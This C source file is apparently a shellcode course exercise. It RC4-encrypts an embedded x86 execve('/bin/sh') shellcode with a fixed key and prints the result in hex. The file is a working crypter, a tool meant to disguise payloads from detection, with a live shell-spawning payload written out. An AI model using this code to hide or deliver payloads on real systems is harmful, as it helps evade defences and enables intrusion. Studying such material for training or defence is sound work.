//crypter.c SLAE-1194
//Bo Pearce
#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <string.h>
#include <stdio.h>

int encrypt(unsigned char *plaintext, int plaintext_len, unsigned char *key, unsigned char *ciphertext)
{
  EVP_CIPHER_CTX *ctx;
  int len;
  int ciphertext_len;

  /* Create and initialise the context */
  if(!(ctx = EVP_CIPHER_CTX_new())) 
      printf("error EVP_CIPHER_CTX_new()\n");

  if(1 != EVP_EncryptInit_ex(ctx, EVP_rc4(), NULL, key, NULL))
      printf("error EVP_EncryptInit_ex()\n");

  if(1 != EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len))
      printf("error EVP_EncryptUpdate()\n");

  ciphertext_len = len;

  if(1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &len))
      printf("error Encrypt_Final_ex()\n");

  ciphertext_len += len;
  //clean up
  EVP_CIPHER_CTX_free(ctx);

  return ciphertext_len;
}

void printHex(uint8_t* buffer, size_t size) {
    for (int i = 0; i < size; i++) {
        printf("\\x%02X", buffer[i]);
    }
    printf("\n");
}

int main (void)
{

  unsigned char *key = (unsigned char *)"SLAE-1194";
  //put payload to encrypt here
  unsigned char *plaintext = (unsigned char *)"\x31\xc9\xf7\xe1\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
  unsigned char ciphertext[256];

  int ciphertext_len;

  //encrypt
  ciphertext_len = encrypt (plaintext, strlen(plaintext), key, ciphertext);
  printf("Plaintext is:\n");
  printHex(plaintext, strlen(plaintext));

  printf("Ciphertext is:\n");
  printHex(ciphertext, ciphertext_len);

  return 0;
}
